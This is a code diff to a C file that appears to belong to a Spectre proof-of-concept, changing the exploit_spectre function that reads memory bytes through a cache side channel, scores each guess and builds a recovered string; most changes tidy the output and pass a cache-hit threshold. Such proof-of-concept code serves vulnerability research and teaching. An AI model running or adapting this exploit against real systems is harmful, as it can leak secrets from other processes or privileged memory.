@@ -3,6 +3,7 @@
 #include <stdint.h>
 #include <string.h>
 #include <time.h>
+#include <ctype.h>
 
 #include "spectre_archs.h"
 #include "spectre_intrinsics.h"
@@ -140,20 +141,21 @@ void exploit_spectre(size_t malicious_x, int len, char *recovered_string) {
 	uint8_t value[2];
 
 	printf("Reading %d bytes:\n", len);
-	for (i = 0; i < len; ++i) {
-		printf("Reading at malicious_x = %p... ", (void *)malicious_x);
+	for (i = 0; i < len; ++i, malicious_x++) {
+		printf("Reading at malicious_x = %p...\n", (void *)malicious_x);
 
-		read_memory_byte(malicious_x++, value, score);
+		read_memory_byte(malicious_x, value, score, cache_hit_threshold);
 
-		printf("%s: ", ((score[0] >= 2 * score[1]) ? "Success" : "Unclear"));
-		printf("0x%02X = '%c' score = %d ", value[0],
-			   (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+		printf("  %-12s: ", ((score[0] >= 2 * score[1]) ? "Success" : "Unclear"));
+		printf("0x%02X = '%c' score = %d\n", value[0],
+			   (isprint(value[0]) ? value[0] : '?'), score[0]);
 		if (score[1] > 0) {
-			printf("(second best: 0x%02X = '%c' score = %d)", value[1], (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
+			printf("  (second best: 0x%02X = '%c' score = %d)\n", value[1],
+				   (isprint(value[1]) ? value[1] : '?'),
+				   score[1]);
 		}
-		printf("\n");
 
-		recovered_string[i] = ((value[0] > 31 && value[0] < 127) ? value[0] : '?');
+		recovered_string[i] = (isprint(value[0]) ? value[0] : '?');
 	}
 }
 
